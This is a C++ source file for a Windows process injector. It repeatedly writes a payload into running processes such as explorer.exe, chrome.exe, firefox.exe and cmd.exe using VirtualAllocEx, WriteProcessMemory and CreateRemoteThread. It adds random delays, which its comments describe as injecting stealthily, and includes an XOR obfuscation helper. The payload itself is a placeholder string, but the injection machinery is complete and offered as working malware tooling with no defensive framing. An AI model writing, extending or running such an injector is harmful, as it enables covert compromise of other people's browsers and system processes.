#include <windows.h>
#include <tlhelp32.h>
#include <random>
#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <chrono>
#include <mutex>

// XOR Encryption/Decryption (unchanged)
class CryptoUtils {
public:
    static std::string xor_encrypt_decrypt(const std::string& data, const std::string& key) {
        std::string result(data);
        for (size_t i = 0; i < data.size(); ++i) {
            result[i] ^= key[i % key.size()];
        }
        return result;
    }

    static std::string encrypt(const std::string& data, const std::string& key) {
        return xor_encrypt_decrypt(data, key);
    }

    static std::string decrypt(const std::string& data, const std::string& key) {
        return xor_encrypt_decrypt(data, key);
    }
};

// Function to inject code into multiple important processes stealthily over time
class Injector {
public:
    Injector() {
        // Define a list of target processes
        target_processes = { "explorer.exe", "chrome.exe", "firefox.exe", "notepad.exe", "msedge.exe", "cmd.exe" };
    }

    // Check if the process is running
    bool is_process_running(const std::string& process_name) {
        PROCESSENTRY32 entry = { sizeof(PROCESSENTRY32) };
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (Process32First(snapshot, &entry)) {
            do {
                if (process_name == entry.szExeFile) {
                    CloseHandle(snapshot);
                    return true;
                }
            } while (Process32Next(snapshot, &entry));
        }

        CloseHandle(snapshot);
        return false;
    }

    // Inject payload into the target process
    bool inject_into_process(const std::string& payload, const std::string& target_process) {
        PROCESSENTRY32 entry = { sizeof(PROCESSENTRY32) };
        HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

        if (Process32First(snapshot, &entry)) {
            do {
                if (target_process == entry.szExeFile) {
                    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, entry.th32ProcessID);
                    if (hProcess) {
                        void* mem = VirtualAllocEx(hProcess, nullptr, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                        if (mem) {
                            WriteProcessMemory(hProcess, mem, payload.c_str(), payload.size(), nullptr);
                            HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)mem, nullptr, 0, nullptr);
                            if (hThread) {
                                CloseHandle(hThread);
                                CloseHandle(hProcess);
                                CloseHandle(snapshot);
                                return true;
                            }
                        }
                        CloseHandle(hProcess);
                    }
                }
            } while (Process32Next(snapshot, &entry));
        }

        CloseHandle(snapshot);
        return false;
    }

    // Perform the injection into multiple processes slowly
    void inject_into_multiple_processes(const std::string& payload) {
        while (true) {
            for (const auto& process : target_processes) {
                if (is_process_running(process)) {
                    std::cout << "Injecting into " << process << "...\n";
                    if (inject_into_process(payload, process)) {
                        std::cout << "Injection successful into " << process << "\n";
                    } else {
                        std::cout << "Failed to inject into " << process << "\n";
                    }
                }
            }

            // Random delay between injections
            sleep_randomly(5000, 15000);  // Random delay between 5 to 15 seconds
        }
    }

private:
    std::vector<std::string> target_processes;

    // Random sleep time to inject stealthily
    void sleep_randomly(int min_ms, int max_ms) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(min_ms, max_ms);
        std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
    }
};

// Main function
int main() {
    Injector injector;
    std::string payload = "payload_placeholder";  // Replace with actual payload

    std::cout << "Starting the injection process...\n";
    std::thread injection_thread(&Injector::inject_into_multiple_processes, &injector, payload);
    injection_thread.join();  // Start injecting in multiple processes in parallel

    return 0;
}
